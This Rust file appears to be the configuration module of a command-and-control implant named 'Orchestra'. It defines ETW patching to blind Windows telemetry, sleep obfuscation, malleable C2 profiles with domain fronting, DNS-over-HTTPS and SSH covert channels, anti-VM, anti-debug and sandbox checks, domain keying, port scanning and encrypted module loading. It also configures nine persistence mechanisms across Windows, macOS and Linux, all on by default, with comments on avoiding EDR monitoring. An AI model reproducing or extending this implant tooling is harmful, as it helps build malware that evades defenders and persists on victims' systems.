use crate::normalized_transport::TrafficProfile;
use std::path::PathBuf;

/// ETW bypass strategy for Windows targets.
///
/// `Direct` (the default) overwrites the entry point of `EtwEventWrite`,
/// `EtwEventWriteEx`, and `NtTraceEvent` with a `ret` instruction.  No debug
/// registers are consumed and there is no exception-handler overhead.
///
/// `Hwbp` uses hardware breakpoints (Dr0–Dr3) via a vectored exception handler,
/// which is the approach implemented in `evasion::setup_hardware_breakpoints`.
/// Both methods may be active simultaneously: `Hwbp` remains the fallback when
/// `VirtualProtect` is blocked by CFG or other policy.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum EtwPatchMethod {
    #[default]
    Direct,
    Hwbp,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum ExecStrategy {
    #[default]
    Indirect,
    Direct,
    Fallback,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum SleepMethod {
    Ekko,
    Foliage,
    #[default]
    Standard,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct SleepConfig {
    #[serde(default)]
    pub method: SleepMethod,
    #[serde(default = "default_base_interval")]
    pub base_interval_secs: u64,
    #[serde(default = "default_jitter_percent")]
    pub jitter_percent: u32,
    #[serde(default)]
    pub working_hours_start: Option<u32>, // e.g. 9 for 09:00
    #[serde(default)]
    pub working_hours_end: Option<u32>, // e.g. 17 for 17:00
    #[serde(default)]
    pub off_hours_multiplier: Option<f32>,
}

fn default_base_interval() -> u64 {
    30
}
fn default_jitter_percent() -> u32 {
    20
}

impl Default for SleepConfig {
    fn default() -> Self {
        Self {
            method: SleepMethod::Standard,
            base_interval_secs: default_base_interval(),
            jitter_percent: default_jitter_percent(),
            working_hours_start: None,
            working_hours_end: None,
            off_hours_multiplier: None,
        }
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub struct MalleableProfile {
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_uri")]
    pub uri: String,
    #[serde(default = "default_host_header")]
    pub host_header: String,
    #[serde(default)]
    pub cdn_relay: bool,
    #[serde(default)]
    pub dns_over_https: bool,
    /// Direct C2 endpoint used when `cdn_relay` is false.
    /// Must be set to a real HTTPS URL (e.g., "https://c2.example.com") for
    /// non-CDN deployments.  Defaults to empty string; the agent will error
    /// at startup if this is empty and cdn_relay is false.
    #[serde(default)]
    pub direct_c2_endpoint: String,
    /// IP address returned by the C2 DNS server to signal that tasking is
    /// available.  Defaults to "1.2.3.4"; override per server so that
    /// multiple deployments can use different sentinels to avoid fingerprinting.
    #[serde(default = "default_doh_beacon_sentinel")]
    pub doh_beacon_sentinel: String,
    /// URL of the server-side DNS-to-C2 bridge that receives the DoH queries
    /// and routes them to the agent session.  **Required** when
    /// `dns_over_https = true`; the agent will refuse to activate the DoH
    /// transport if this field is absent or empty.  Example:
    /// `"https://c2.example.com/doh-bridge"`.
    #[serde(default)]
    pub doh_server_url: Option<String>,
    /// CDN relay endpoint for domain fronting.  The TCP connection goes here;
    /// the Host header carries the actual C2 domain.  Required when
    /// `cdn_relay = true`; the agent will bail at startup if this is empty
    /// and cdn_relay is enabled.  Example: `"cdn-provider.example.com"`.
    #[serde(default)]
    pub cdn_endpoint: String,
    /// Optional kill date in `YYYY-MM-DD` format (UTC).  When set, the agent
    /// will refuse to connect after this date.  Leave empty to disable.
    #[serde(default)]
    pub kill_date: String,
    /// SSH relay hostname for the `ssh-transport` feature.
    #[serde(default)]
    pub ssh_host: Option<String>,
    /// SSH relay port (default 22).
    #[serde(default)]
    pub ssh_port: Option<u16>,
    /// SSH username for authentication.
    #[serde(default)]
    pub ssh_username: Option<String>,
    /// SSH authentication configuration.
    #[serde(default)]
    pub ssh_auth: Option<SshAuthConfig>,
    /// Expected SHA-256 fingerprint of the SSH server host key (hex, optional).
    /// When set the agent rejects servers whose key does not match.  When
    /// absent the agent accepts any key but logs a warning.
    #[serde(default)]
    pub ssh_host_key_fingerprint: Option<String>,
}

/// Authentication method for the SSH covert transport.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case", tag = "type")]
pub enum SshAuthConfig {
    /// Authenticate with an SSH private key loaded from disk at runtime.
    Key { key_path: String },
    /// Authenticate with a password (less secure; use key-based auth in
    /// production).
    Password { password: String },
    /// Delegate to the running ssh-agent process via the `SSH_AUTH_SOCK`
    /// environment variable.  Not available on Windows.
    Agent,
}

fn default_user_agent() -> String {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string()
}
fn default_uri() -> String {
    "/api/v1/update".to_string()
}
fn default_host_header() -> String {
    "cdn.example.com".to_string()
}
fn default_doh_beacon_sentinel() -> String {
    "1.2.3.4".to_string()
}

impl Default for MalleableProfile {
    fn default() -> Self {
        Self {
            user_agent: default_user_agent(),
            uri: default_uri(),
            host_header: default_host_header(),
            cdn_relay: false,
            dns_over_https: false,
            direct_c2_endpoint: String::new(),
            doh_beacon_sentinel: default_doh_beacon_sentinel(),
            doh_server_url: None,
            cdn_endpoint: String::new(),
            kill_date: String::new(),
            ssh_host: None,
            ssh_port: None,
            ssh_username: None,
            ssh_auth: None,
            ssh_host_key_fingerprint: None,
        }
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct Config {
    #[serde(default)]
    pub sleep: SleepConfig,
    #[serde(default)]
    pub malleable_profile: MalleableProfile,
    #[serde(default)]
    pub exec_strategy: ExecStrategy,
    #[serde(default = "default_allowed_paths")]
    pub allowed_paths: Vec<String>,
    #[serde(default = "default_heartbeat")]
    pub heartbeat_interval_secs: u64,
    #[serde(default)]
    pub persistence_enabled: bool,
    #[serde(default = "default_module_repo")]
    pub module_repo_url: String,
    /// Base64-encoded AES-256-GCM key used to decrypt signed capability modules.
    /// Distinct from `module_verify_key`; a module must pass *both* decryption
    /// (authenticated by GCM tag) and signature verification before it is loaded.
    #[serde(default, alias = "module_signing_key")]
    pub module_aes_key: Option<String>,
    /// Base64-encoded Ed25519 verifying (public) key used to check the 64-byte
    /// signature prepended to each module after decryption.  Required when the
    /// `module-signatures` feature is enabled.  If absent the compile-time
    /// constant `MODULE_SIGNING_PUBKEY` is used instead.
    #[serde(default)]
    pub module_verify_key: Option<String>,
    /// Directory from which `DeployModule` loads pre-staged module blobs.
    /// Defaults to `~/.cache/orchestra/modules` on Unix and
    /// `%LOCALAPPDATA%\Orchestra\modules` on Windows.
    #[serde(default = "default_module_cache_dir")]
    pub module_cache_dir: String,
    /// Wire-level traffic shaping profile. See [`TrafficProfile`] and
    /// [`crate::normalized_transport`] for details.
    #[serde(default)]
    pub traffic_profile: TrafficProfile,
    /// If set, the agent will refuse to start unless the host machine is
    /// joined to this DNS domain (case-insensitive).
    #[serde(default)]
    pub required_domain: Option<String>,
    /// When `true`, the agent refuses to start when virtualization or
    /// sandbox artifacts are detected. Defaults to `false` because most
    /// legitimate enterprise endpoints today are virtualized.
    #[serde(default)]
    pub refuse_in_vm: bool,
    /// When `true`, the agent refuses to start if a debugger is attached to
    /// the agent process itself. Defaults to `false`; debugger detection is
    /// otherwise reported as telemetry only.
    #[serde(default)]
    pub refuse_when_debugged: bool,
    /// Optional sandbox-score threshold. When set, startup is refused only if
    /// the combined sandbox score is greater than or equal to this value.
    /// Leave unset to keep sandbox scoring informational.
    #[serde(default)]
    pub sandbox_score_threshold: Option<u32>,
    /// SHA-256 fingerprint (64 lowercase hex chars) of the Orchestra Control
    /// Center's TLS certificate. When set, `outbound-c` mode pins the server
    /// certificate instead of accepting any certificate.
    ///
    /// Generate with:
    ///   openssl x509 -in server.crt -outform DER | sha256sum
    #[serde(default)]
    pub server_cert_fingerprint: Option<String>,
    /// Maximum number of concurrent connections for port scanning.
    #[serde(default = "default_port_scan_concurrency")]
    pub port_scan_concurrency: usize,
    /// Timeout in milliseconds for each port connection during scans.
    #[serde(default = "default_port_scan_timeout")]
    pub port_scan_timeout_ms: u64,
    /// Fine-grained control over which persistence mechanisms are enabled.
    /// Defaults to all mechanisms on; operators can selectively disable
    /// individual mechanisms without rebuilding the agent.
    #[serde(default)]
    pub persistence: PersistenceConfig,
    /// ETW bypass method. Defaults to [`EtwPatchMethod::Direct`] (overwrite
    /// function entry with `ret`) when absent. Set to `hwbp` to use the
    /// hardware-breakpoint VEH approach instead.
    #[serde(default)]
    pub etw_patch_method: Option<EtwPatchMethod>,
}

/// Per-platform list of persistence mechanisms to install.
///
/// Sensible defaults enable multiple mechanisms so that removal of one does
/// not drop persistence entirely.  Operators can disable individual mechanisms
/// (e.g., `wmi_subscription = false` on locked-down endpoints where WMI
/// commands are monitored) without rebuilding the agent.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct PersistenceConfig {
    // ── Windows ───────────────────────────────────────────────────────────────
    /// HKCU\Software\Microsoft\Windows\CurrentVersion\Run entry (Windows).
    #[serde(default = "default_true")]
    pub registry_run_key: bool,
    /// Copy to the user Startup folder (Windows).
    #[serde(default = "default_true")]
    pub startup_folder: bool,
    /// WMI __EventFilter + CommandLineEventConsumer subscription (Windows).
    /// Requires PowerShell and WMI access; disable on heavily-locked endpoints.
    #[serde(default = "default_true")]
    pub wmi_subscription: bool,

    // ── macOS ─────────────────────────────────────────────────────────────────
    /// ~/Library/LaunchAgents plist loaded at user login (macOS).
    #[serde(default = "default_true")]
    pub launch_agent: bool,
    /// /Library/LaunchDaemons plist loaded at boot (macOS, requires root).
    #[serde(default = "default_true")]
    pub launch_daemon: bool,
    /// Login item added via osascript / System Events (macOS, user session).
    #[serde(default = "default_true")]
    pub login_item: bool,
    /// @reboot crontab entry as a fallback (macOS / Linux).
    #[serde(default = "default_true")]
    pub cron_job: bool,

    // ── Linux ─────────────────────────────────────────────────────────────────
    /// ~/.config/systemd/user service enabled at login (Linux).
    #[serde(default = "default_true")]
    pub systemd_service: bool,
    /// Append a backgrounded exec block to ~/.bashrc / ~/.profile (Linux).
    /// Disable if the shell profiles are monitored by an EDR.
    #[serde(default = "default_true")]
    pub shell_profile: bool,
}

fn default_true() -> bool {
    true
}

impl Default for PersistenceConfig {
    fn default() -> Self {
        Self {
            registry_run_key: true,
            startup_folder: true,
            wmi_subscription: true,
            launch_agent: true,
            launch_daemon: true,
            login_item: true,
            cron_job: true,
            systemd_service: true,
            shell_profile: true,
        }
    }
}

fn default_allowed_paths() -> Vec<String> {
    #[cfg(target_os = "windows")]
    {
        vec![
            "C:\\Users".into(),
            "C:\\Windows\\Temp".into(),
            "C:\\ProgramData".into(),
        ]
    }
    #[cfg(target_os = "macos")]
    {
        vec!["/Users".into(), "/var/log".into(), "/tmp".into()]
    }
    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
    {
        vec!["/var/log".into(), "/home".into(), "/tmp".into()]
    }
}

fn default_heartbeat() -> u64 {
    30
}

fn default_port_scan_concurrency() -> usize {
    50
}

fn default_port_scan_timeout() -> u64 {
    200
}

fn default_module_repo() -> String {
    "https://updates.example.com/modules".into()
}

pub fn default_module_cache_dir() -> String {
    if cfg!(windows) {
        let base = std::env::var_os("LOCALAPPDATA")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("C:\\ProgramData"));
        base.join("Orchestra")
            .join("modules")
            .to_string_lossy()
            .into_owned()
    } else {
        // Prefer $XDG_CACHE_HOME; fall back to $HOME/.cache.
        // Never fall back to /tmp which is world-writable (M-38 fix).
        let cache_base = std::env::var_os("XDG_CACHE_HOME")
            .map(PathBuf::from)
            .or_else(|| {
                std::env::var_os("HOME")
                    .map(|h| PathBuf::from(h).join(".cache"))
            });
        cache_base
            .map(|p| p.join("orchestra").join("modules"))
            .unwrap_or_default()
            .to_string_lossy()
            .into_owned()
    }
}

impl Default for Config {
    fn default() -> Self {
        let module_cache_dir = default_module_cache_dir();
        let mut allowed_paths = default_allowed_paths();

        // Ensure the module cache directory is always in allowed_paths.
        // Without this, deployments running as root (where HOME=/root) would
        // have a module_cache_dir under /root/.cache which is not covered by
        // the Linux default allowed_paths of ["/var/log", "/home", "/tmp"].
        let cache_parent = PathBuf::from(&module_cache_dir)
            .parent()
            .and_then(|p| p.parent()) // strip .../modules -> .../orchestra -> .../cache
            .map(|p| p.to_string_lossy().into_owned());
        if let Some(parent) = cache_parent {
            if !allowed_paths.iter().any(|a| parent.starts_with(a.as_str())) {
                allowed_paths.push(module_cache_dir.clone());
            }
        }

        Self {
            allowed_paths,
            heartbeat_interval_secs: default_heartbeat(),
            persistence_enabled: false,
            module_repo_url: default_module_repo(),
            module_aes_key: None,
            module_verify_key: None,
            module_cache_dir,
            traffic_profile: TrafficProfile::default(),
            required_domain: None,
            refuse_in_vm: false,
            refuse_when_debugged: false,
            sandbox_score_threshold: None,
            server_cert_fingerprint: None,
            port_scan_concurrency: default_port_scan_concurrency(),
            port_scan_timeout_ms: default_port_scan_timeout(),
            sleep: SleepConfig::default(),
            malleable_profile: MalleableProfile::default(),
            exec_strategy: ExecStrategy::Indirect,
            persistence: PersistenceConfig::default(),
            etw_patch_method: None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(target_os = "linux")]
    #[test]
    fn default_allowed_paths_linux() {
        let paths = default_allowed_paths();
        assert!(paths.iter().any(|p| p == "/var/log"), "Linux should include /var/log");
        assert!(paths.iter().any(|p| p == "/home"), "Linux should include /home");
        assert!(paths.iter().any(|p| p == "/tmp"), "Linux should include /tmp");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn default_allowed_paths_macos() {
        let paths = default_allowed_paths();
        assert!(paths.iter().any(|p| p == "/Users"), "macOS should include /Users");
        assert!(paths.iter().any(|p| p == "/tmp"), "macOS should include /tmp");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn default_allowed_paths_windows() {
        let paths = default_allowed_paths();
        assert!(
            paths.iter().any(|p| p.contains("Users")),
            "Windows should include Users path"
        );
        assert!(
            paths.iter().any(|p| p.contains("Temp")),
            "Windows should include Temp path"
        );
    }

    #[test]
    fn default_config_module_cache_dir_is_accessible() {
        let cfg = Config::default();
        let cache = &cfg.module_cache_dir;
        // The module_cache_dir must be reachable via allowed_paths
        // (either directly or through a parent prefix).
        let reachable = cfg.allowed_paths.iter().any(|p| {
            cache.starts_with(p.as_str()) || p.starts_with(cache.as_str())
        });
        assert!(
            reachable,
            "module_cache_dir '{}' is not covered by allowed_paths: {:?}",
            cache,
            cfg.allowed_paths
        );
    }
}
